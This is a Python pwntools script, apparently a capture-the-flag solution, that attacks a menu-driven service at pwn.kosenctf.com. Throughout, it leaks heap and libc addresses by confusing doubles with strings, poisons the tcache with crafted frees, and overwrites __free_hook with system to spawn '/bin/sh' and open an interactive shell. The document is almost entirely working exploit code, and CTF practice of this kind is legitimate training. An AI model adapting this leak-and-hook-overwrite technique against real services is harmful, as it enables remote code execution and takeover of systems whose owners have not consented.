from pwn import *
import struct

bstr = lambda x: x if isinstance(x,bytes) else x.encode()
sstr = lambda x: x if isinstance(x,str) else x.decode()
ehex = lambda b: bstr(b).hex()
dhex = lambda s: bytes.fromhex(sstr(s))
itoa = lambda i: bstr(str(i))

p = remote("pwn.kosenctf.com", 9005)
# p = remote("localhost", 1234)

def setopt(idx, t, value):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(itoa(idx))
    p.recvuntil(b": ")
    p.sendline(itoa(t))
    p.recvuntil(b": ")
    p.sendline(value)

def showlist():
    p.recvuntil(b'> ')
    p.sendline(b'2')

def dellist(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(itoa(idx))

setopt(0, 2, bstr(str(struct.unpack("d", p64(0x6020a8))[0])))
setopt(1, 1, b"/bin/sh")
setopt(2, 2, bstr(str(struct.unpack("d", p64(0x602020))[0])))

showlist()
p.recvuntil(b"0: [string] \"")
hl = u64((p.recvuntil(b"\"")[:-1]).ljust(8, b"\x00"))
p.recvuntil(b"2: [string] \"")
ll = u64((p.recvuntil(b"\"")[:-1]).ljust(8, b"\x00"))
log.info("%#x", hl)
log.info("%#x", ll)

fh = ll + 0x36ceb8
sy = ll - 0x31550

setopt(3, 1, b"A"*6 + b"\x00\x00" + b"A"*(0x31 - 8))
setopt(4, 2, bstr(str(struct.unpack("d", p64(hl + 0x80))[0])))
setopt(5, 1, b"A"*6 + b"\x00\x00" + b"A"*(0x31 - 8))
setopt(6, 1, b"A"*6 + b"\x00\x00" + b"A"*(0x31 - 8))
dellist(5)
dellist(3)
dellist(4)

setopt(3, 1, p64(0x602010))
dellist(6)
setopt(4, 1, b"C"*6 + b"\x00\x00")
setopt(5, 1, b"C"*6 + b"\x00\x00")
p.recvuntil(b'> ')
p.sendline(b"/bin/sh\x00" + p64(sy))
# setopt(6, p64(sy), p64(sy) + b"A"*(0xf1 - 8))


p.interactive()
